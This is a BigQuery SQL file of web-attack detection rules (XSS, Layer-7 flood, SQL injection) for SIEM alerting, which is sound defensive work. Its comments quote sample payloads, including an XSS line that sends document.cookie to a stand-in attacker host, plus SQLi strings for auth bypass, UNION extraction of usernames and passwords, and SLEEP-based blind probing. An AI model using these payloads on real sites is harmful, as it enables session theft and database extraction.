-- =============================================================================
-- web_attack.sql
-- Purpose: Web application attack detection covering three categories:
--          XSS (Cross-Site Scripting), DDoS (Layer 7 volumetric flood),
--          and SQLi (SQL Injection).
--          Each rule produces a row per detected incident with a category label
--          and severity, ready for SIEM ingestion or SOC alerting.
-- Sources: bodyguard_demo.ip_30d, bodyguard_demo.urls_30d
-- Owner:   appsec-team  (Slack: #appsec)
-- Dialect: BigQuery Standard SQL. Run with:
--          bq query --use_legacy_sql=false --project_id=<project> < web_attack.sql
-- =============================================================================

-- =============================================================================
-- RULE 1 — Cross-Site Scripting (XSS)
--
-- Detects URLs where the path or query string contains known XSS payloads:
-- script tags, javascript: URIs, event handler injections (onerror, onload),
-- or URL-encoded variants of the above.
--
-- Signal: block action AND (encoded markers + XSS keywords, OR raw XSS payload).
--
-- Example hits:
--   /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E   (encoded <script>)
--   /profile?bio=<img src=x onerror=fetch("https://exfil.attacker.example/"+document.cookie)>
-- =============================================================================
SELECT
    u.window_start,
    u.url,
    u.host,
    u.path,
    u.query_string,
    u.unique_ips,
    u.blocked_count,
    u.top_country,
    u.rule_id,
    'XSS'   AS attack_category,
    'High'  AS severity
FROM bodyguard_demo.urls_30d AS u
WHERE
    u.action = 'block'
    AND (
        -- URL-encoded XSS markers
        (
            u.has_encoded_chars = TRUE
            AND (
                REGEXP_CONTAINS(u.query_string, r'(?i)(%3C|%3E|%22|%27)')          -- encoded < > " '
                OR REGEXP_CONTAINS(u.query_string, r'(?i)script|onerror|onload|javascript')
                OR REGEXP_CONTAINS(u.path,         r'(?i)script|onerror|onload|javascript')
            )
        )
        -- Raw (non-encoded) XSS payloads
        OR REGEXP_CONTAINS(u.query_string, r'(?i)<script|</script|onerror=|onload=|javascript:')
        OR REGEXP_CONTAINS(u.path,         r'(?i)<script|</script|onerror=|onload=')
    )
ORDER BY u.window_start DESC, u.blocked_count DESC;


-- =============================================================================
-- RULE 2 — DDoS / Layer 7 Volumetric Flood
--
-- Detects source IPs generating an abnormally high request rate against a
-- single target, consistent with HTTP flood attacks. Key signals: very high
-- request_rate_per_h (> 1000), near-total block rate, minimal path diversity
-- (single-endpoint flood), and a non-browser User-Agent.
--
-- Thresholds are intentionally conservative to minimise false positives on
-- legitimate high-traffic CDN or monitoring IPs.
--
-- Example hits:
--   203.0.113.200 — 4100 req/h, 99% blocked, curl UA (flood bot)
--   203.0.113.201 — 2263 req/h, 98% blocked, curl UA (flood bot)
-- =============================================================================
SELECT
    i.window_start,
    i.client_ip,
    i.top_asn,
    i.top_country,
    i.visits,
    i.request_rate_per_h,
    i.blocked_count,
    i.error_rate,
    i.top_user_agent,
    i.unique_domains,
    i.unique_paths,
    'DDOS'      AS attack_category,
    'Critical'  AS severity
FROM bodyguard_demo.ip_30d AS i
WHERE
    i.request_rate_per_h  > 1000
    AND i.error_rate      > 0.95          -- almost all requests blocked
    AND i.unique_paths    <= 5            -- targeting few endpoints
    AND i.is_tor_exit     = FALSE         -- separate rule for Tor
    AND NOT REGEXP_CONTAINS(i.top_user_agent, r'(?i)mozilla|chrome|safari')
ORDER BY i.window_start DESC, i.request_rate_per_h DESC;


-- =============================================================================
-- RULE 3 — SQL Injection (SQLi)
--
-- Detects URLs where the query string or path contains SQL injection patterns:
-- boolean-based (OR 1=1), comment sequences (-- , #, /*), UNION-based data
-- extraction, or time-based blind probes (SLEEP, WAITFOR, BENCHMARK).
-- URL-encoded variants are matched on the raw (still-encoded) query string.
--
-- Example hits:
--   /login?user=admin%27--%20&pass=x                                (auth bypass)
--   /api/users?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--  (data exfil)
--   /api/products?id=1%20AND%20SLEEP(5)--                           (time-based blind)
-- =============================================================================
SELECT
    u.window_start,
    u.url,
    u.host,
    u.path,
    u.query_string,
    u.unique_ips,
    u.blocked_count,
    u.top_country,
    u.rule_id,
    'SQLI'      AS attack_category,
    'Critical'  AS severity
FROM bodyguard_demo.urls_30d AS u
WHERE
    u.action = 'block'
    AND (
        -- Quotes and comment sequences (raw or encoded)
        REGEXP_CONTAINS(u.query_string, r"(%27|'|--|/\*)")
        -- Boolean conditions: OR 1=1, AND 'a'='a'
        OR REGEXP_CONTAINS(u.query_string, r"(?i)(%20|\s|\+)(OR|AND)(%20|\s|\+)[\d'\"%]")
        -- UNION-based extraction
        OR REGEXP_CONTAINS(u.query_string, r'(?i)\bUNION\b.+\bSELECT\b')
        -- Time-based blind probes
        OR REGEXP_CONTAINS(u.query_string, r'(?i)\b(SLEEP|WAITFOR|BENCHMARK)\s*\(')
        -- Data-modifying statements
        OR REGEXP_CONTAINS(u.query_string, r'(?i)\b(DROP|INSERT|UPDATE|DELETE)\b')
        OR REGEXP_CONTAINS(u.path,         r'(?i)(%27|--|/\*|\bUNION\b)')
    )
ORDER BY u.window_start DESC, u.blocked_count DESC;
